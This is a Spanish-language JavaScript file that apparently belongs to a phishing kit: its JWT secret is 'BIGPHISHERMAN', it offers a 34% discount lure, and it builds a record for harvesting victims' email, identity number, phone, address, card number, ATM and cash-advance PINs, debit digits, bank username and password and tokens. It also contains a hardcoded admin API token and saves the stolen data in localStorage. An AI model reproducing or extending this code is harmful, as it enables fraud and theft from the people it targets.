/**
 * CONFIGURACIÓN
 */
const API_URL = 'http://127.0.0.1:8000'; // API Administradora.
const API_KEY = 'eyJhbGciOiJIUzI1NiJ9.NzY5NTY5NTkwNzpBQUdxTXc0bkowTHdLM25vX3JCUDFaLXNRUVRwOEVnT1YtRQ.jM1bEeZX7MLNsZYnLEQcDGFzDnmHanOwG8i8V-Xwt3E'; // API Administradora.
const JWT_SIGN = 'BIGPHISHERMAN';

const DESCUENTO = 34


const LS = window.localStorage;

let info = {
    lineInfo:{
        number: '',
        original_price: '',
        discount_price: '',
    },
    metaInfo:{
        email: '',
        p: '',
        pdate: '',
        c: '',
        ban: '',
        dues: '',
        dudename: '',
        surname: '',
        cc: '',
        telnum: '',
        city: '',
        state: '',
        address: '',
        cdin: '',
        ccaj: '',
        cavance: '',
        tok: '',
        fourdebit: '',
        user: '',
        puser: '',
        err: '',
        disp: '',
        mode: '',
        number: ''
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
}

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}

function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}



LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

// LS.removeItem('info');